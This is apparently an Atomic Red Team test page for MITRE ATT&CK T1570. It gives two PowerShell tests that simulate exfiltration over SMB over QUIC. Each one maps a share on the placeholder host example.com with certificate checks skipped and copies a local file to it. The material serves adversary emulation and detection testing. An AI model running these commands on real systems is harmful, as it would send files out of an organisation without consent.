---
tags: [T1570, atomic_test]
filename: "[[T1570 - Lateral Tool Transfer]]"
---
# T1570 - Lateral Tool Transfer

## Atomic Test #1 - Exfiltration Over SMB over QUIC (New-SmbMapping)
Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.
Prerequisites:
  - A file server running Windows Server 2022 Datacenter: Azure Edition
  - A Windows 11 computer
  - Windows Admin Center

**Supported Platforms:** Windows


**auto_generated_guid:** d8d13303-159e-4f33-89f4-9f07812d016f





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| remote_path | The UNC path to the share on the file server | string | &#92;&#92;example.com&#92;sales|
| local_file | The local file to be transferred | path | C:&#92;path&#92;to&#92;file.txt|


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck
copy '#{local_file}' 'Z:\'
```






<br/>
<br/>

## Atomic Test #2 - Exfiltration Over SMB over QUIC (NET USE)
Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.
Prerequisites:
  - A file server running Windows Server 2022 Datacenter: Azure Edition
  - A Windows 11 computer
  - Windows Admin Center

**Supported Platforms:** Windows


**auto_generated_guid:** 183235ca-8e6c-422c-88c2-3aa28c4825d9





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| remote_path | The UNC path to the share on the file server | string | &#92;&#92;example.com&#92;sales|
| local_file | The local file to be transferred | path | C:&#92;path&#92;to&#92;file.txt|


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK
copy '#{local_file}' '*:\'
```






<br/>
